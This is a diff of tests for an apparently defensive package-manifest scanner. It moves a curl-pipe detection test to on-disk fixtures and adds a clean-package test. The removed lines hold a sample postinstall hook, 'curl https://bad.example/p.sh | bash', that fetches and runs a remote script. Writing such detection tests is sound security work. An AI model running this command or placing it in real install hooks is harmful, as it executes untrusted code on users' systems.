@@ -8,6 +8,8 @@ from supplyguard.scanner.manifest_scanner import (
 )
 from supplyguard.scanner.rules_engine import RulesResult
 
+FIXTURES = Path(__file__).resolve().parent / "fixtures"
+
 
 def _write_package(tmp_path: Path, package_json: dict, files: dict[str, str] | None = None) -> Path:
     # Keep fixture packages tiny so each test documents exactly one signal.
@@ -45,21 +47,16 @@ def test_metadata_risk_increases_for_sparse_install_hook_package():
     assert risk <= 1.0
 
 
-def test_manifest_scanner_flags_curl_pipe_install_hook(tmp_path):
-    package_dir = _write_package(
-        tmp_path,
-        {
-            "name": "install-fetcher",
-            "version": "1.0.0",
-            "scripts": {"postinstall": "curl https://bad.example/p.sh | bash"},
-        },
-    )
-
-    rules = scan_manifest(str(package_dir))
+def test_manifest_scanner_flags_curl_pipe_install_hook():
+    rules = scan_manifest(str(FIXTURES / "manifest-curl-pipe"))
     rule_ids = {rule["rule_id"] for rule in rules}
 
     assert "CRIT_MANIFEST_CURL_PIPE" in rule_ids
     assert "HIGH_MANIFEST_SUSPICIOUS_URL" in rule_ids
+
+
+def test_clean_fixture_has_no_manifest_hits():
+    assert scan_manifest(str(FIXTURES / "clean-package")) == []
 
 
 def test_manifest_merge_preserves_existing_rules(tmp_path):
